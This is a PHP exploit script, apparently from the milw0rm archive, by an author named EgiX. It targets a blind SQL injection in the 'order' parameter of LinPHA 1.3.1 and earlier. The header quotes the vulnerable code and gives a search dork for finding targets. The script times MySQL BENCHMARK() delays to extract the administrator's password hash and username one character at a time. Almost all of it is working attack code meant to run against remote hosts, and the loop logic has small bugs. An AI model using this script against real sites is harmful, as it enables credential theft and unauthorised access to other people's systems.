<?php

/*
	LinPHA <= 1.3.1 (new_images.php) Remote Blind SQL Injection
	Hash Fishing Exploit / BENCHMARK() method
	
	author...: EgiX
	mail.....: n0b0d1es[at]hotmail[dot]com
	
	link.....: http://linpha.sourceforge.net/
	dork.....: "LinPHA Version 1.3.x" or "The LinPHA developers"
	
	vulnerable code in /include/img_view.class.php:
	
	183.	function setDefaultOrder($default_order)
	184.	{
	185.		if(isset($_REQUEST['order']))
	186.		{
	187.			$this->order = $_REQUEST['order'];
	188. 
	189.			if($default_order != $_REQUEST['order'])
	190.			{
	191.				$this->link_address .= '&order='.$_REQUEST['order'];
	192.			}
	193.		}
	194.		else
	195.		{
	196.			$this->order = $default_order;
	197.		}
	198.	}
	199.
	200.	//
	201.	// set sql query string
	202.	//
	203.	function setSql($sql_begin,$sql_where)
	204.	{
	205.		$this->sql_where = $sql_where." ".sql_perm()." AND ".
	206.		PREFIX."photos.prev_path LIKE ".$GLOBALS['db']->Concat(PREFIX."first_lev_album.path","'%'").
	207.		" ORDER by ".P.".".get_thumb_order($this->order); <-- BUG
	208.	
	209.		if(empty($sql_begin))
	210.		{
	211.			$sql_begin = "SELECT ".P.".id AS id, ".P.".name As name, ".P.".filename AS filename, " .
	212.			"".P.".prev_path AS prev_path, ".P.".date AS date, " .
	213.			"".P.".level AS level, ".P.".md5sum AS md5sum";
	214.
	215.		}
	216.		$this->sql = $sql_begin.$this->sql_where;
	217.		$query = $GLOBALS['db']->Execute($this->sql);
	218.		$this->num_photos = $query->RecordCount();
	219.	}
	
	$_REQUEST['order'] ('$this->order') parameter isn't properly sanitised, so we should be able (with MySQL version 4.1 or higher)
	to inject sql code in a subquery after 'ORDER by' statement...we can retrive admin credentials with BENCHMARK() function!

	Too see table prefix: http://[host]/[linpha]/new_images.php?order=foo
*/

error_reporting(0);
ini_set("default_socket_timeout",5);
set_time_limit(0);

function http_send($host, $packet)
{
	$i = 0;
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		if ($i++ == 10) die();
		print "\n[-] No response from ".$host.":80 Trying again...\n";
		$sock = fsockopen($host,$port);
		sleep(1);
	}
	fputs($sock, $packet);
	$resp = "";
	while (!feof($sock)) $resp .= fread($sock, 1);
	fclose($sock);
	return $resp;
}

function getmicrotime()
{ 
	list($usec, $sec) = explode(" ", microtime()); 
	return ((float)$usec + (float)$sec); 
}

function getdelay($query)
{
	global $host, $path;
	
	$pck = "GET ".$path."new_images.php?order=$query HTTP/1.1\r\n";
	$pck.= "Host: ".$host."\r\n";
	$pck.= "Keep-Alive: 300\r\n";
	$pck.= "Connection: keep-alive\r\n\r\n";
	$start = getmicrotime()*1000;
	http_send($host, $pck);
	$end = getmicrotime()*1000;

	return ($end - $start);
}

function normaldelay()
{
	global $count, $prefix, $uid;
	
	$sql = "id,(SELECT/**/password/**/FROM/**/".$prefix."_users/**/WHERE/**/id=".$uid."/**/AND/**/RAND(IF(1=0,BENCHMARK(".$count.",MD5(1)),0)))";
	$d1 = getdelay($sql);
	$d2 = getdelay($sql);
	$d3 = getdelay($sql);
	$m = ($d1 + $d2 + $d3) / 3;
	return (intval($m));
}

function benchmarkdelay()
{
	global $count, $prefix, $uid;
   
	$sql = "id,(SELECT/**/password/**/FROM/**/".$prefix."_users/**/WHERE/**/id=".$uid."/**/AND/**/RAND(IF(1=1,BENCHMARK(".$count.",MD5(1)),0)))";
	$d1 = getdelay($sql);
	$d2 = getdelay($sql);
	$d3 = getdelay($sql);
	$m = ($d1 + $d2 + $d3) / 3;
	return (intval($m));
}

function check_query($query)
{
	global $ndelay;
	
	$ret = false;
	$d = intval(getdelay($query));
	if ($d > ($ndelay * 2)) $ret = true;
	return $ret;
}

function check_target()
{
	// see if MySQL version is >= 4.1 (subqueries support) or other error
	global $host, $path;
	
	print "\n[-] Checking $host...";
	$pck = "GET ".$path."new_images.php?order=id,(SELECT/**/1) HTTP/1.1\r\n";
	$pck.= "Host: ".$host."\r\n";
	$pck.= "Keep-Alive: 300\r\n";
	$pck.= "Connection: keep-alive\r\n\r\n";
	$buff = http_send($host, $pck);
	if (!strpos($buff, "The LinPHA developers"))
		die("\n\n[-] Error... Probably wrong MySQL version!\n");
	else
		print " OK!\n";
}

print "\n+-----------------------------------------------------------------------------+";
print "\n| LinPHA <= 1.3.1 (new_images.php) Remote Blind SQL Injection Exploit by EgiX |";
print "\n+-----------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage:		php $argv[0] host path [delay] [prefix] [userid]\n";
	print "\nhost:		target server (ip/hostname)";
	print "\npath:		path to linpha directory";
	print "\ndelay:		delay for BENCHMARK() (dafault: 1000000)";
	print "\nprefix:		table's prefix (default: linpha)";
	print "\nuserid:		user id (default: 1 - admin)\n";
	print "\nExample:	php $argv[0] localhost /linpha/";
	print "\nExample:	php $argv[0] localhost / 2000000 other_prefix 2\n";
	die();
}

$host	= $argv[1];
$path	= $argv[2];
$count	= (isset($argv[3]) ? $argv[3] : 1000000);
$prefix	= (isset($argv[4]) ? $argv[4] : "linpha");
$uid	= (isset($argv[5]) ? $argv[5] : "1");

check_target();

print "\n[-] Testing delay time...";
$ndelay = normaldelay();
print "\n[-] Normal delay: $ndelay ms";
$bdelay = benchmarkdelay();
print "\n[-] Benchmark delay: $bdelay ms\n";

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = "";
print "\n[-] MD5 Hash: ";

while (!strpos($md5, chr(0)))
{
	for ($i = 0; $i <= count($hash); $i++)
	{
  		if ($i == count($hash)) die("\n[-] Exploit failed...\n");

		$sql = "id,(SELECT/**/password/**/FROM/**/".$prefix."_users/**/WHERE/**/id=".$uid."/**/OR/**/" .
		"RAND(IF((ORD(SUBSTRING(password,".$index.",1))=".$hash[$i]."),BENCHMARK(".$count.",MD5(1)),1)))";

        	if (check_query($sql))
		{
			$md5 .= chr($hash[$i]);
			print chr($hash[$i]);
			break;
		}
	}

	$index++;
}

$char = array(0); // null char
for ($j = 97; $j <= 122; $j++) $char = array_merge($char, array($j)); // a-z
for ($j = 65; $j <= 90; $j++) $char = array_merge($char, array($j)); // A-Z
for ($j = 48; $j <= 57; $j++) $char = array_merge($char, array($j)); // 0-9

$index = 1; $user = "";
print "\n[-] Username: ";

while (!strpos($user, chr(0)))
{
	for ($i = 0; $i <= count($hash); $i++)
	{
  		if ($i == count($hash)) die("\n[-] Exploit failed...\n");

		$sql = "id,(SELECT/**/nickname/**/FROM/**/".$prefix."_users/**/WHERE/**/id=".$uid."/**/OR/**/" .
		"RAND(IF((ORD(SUBSTRING(nickname,".$index.",1))=".$char[$i]."),BENCHMARK(".$count.",MD5(1)),1)))";

        	if (check_query($sql))
		{
			$user .= chr($char[$i]);
			print chr($char[$i]);
			break;
		}
	}

	$index++;
}

print "\n\n[-] Successfull!\n";

?>
# milw0rm.com [2007-07-29]
